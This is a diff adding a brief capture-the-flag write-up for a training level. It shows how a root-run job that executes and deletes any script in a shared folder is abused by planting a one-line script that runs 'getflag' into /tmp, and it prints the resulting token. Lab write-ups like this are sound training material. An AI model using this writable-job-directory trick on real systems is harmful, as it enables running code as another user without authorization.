@@ -1,0 +1,27 @@
+Upon arrival, we get nothing.
+Let's find if we have access to any files owned by flag05 : `find / -uid 3005 -gid 3005` (you can find flag05's uid and gid in the /etc/passwd file with `cat`).
+We can access : /usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+We can read /usr/sbin/openarenaserver :
+"#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done"
+
+This script will execute any script in the /opt/openarenaserver, then delete it.
+We'll try to exploit it in order to get the flag, like so :
+
+script.sh :
+"#/bin/sh
+
+echo "$(getflag)" > /tmp/openarena_flag
+"
+
+You can directly write this script in the folder, or do it like so :
+`echo 'echo "$(getflag)" > /tmp/openarena_flag' > /opt/openarenaserver/script.sh`
+
+We just have to wait for the openarenaserver script to launch our script, then retrieve the content from the `getflag` command in /tmp/openarena_flag.
+`cat /tmp/openarena_flag` => Check flag.Here is your token : viuaaale9huek52boumoomioc
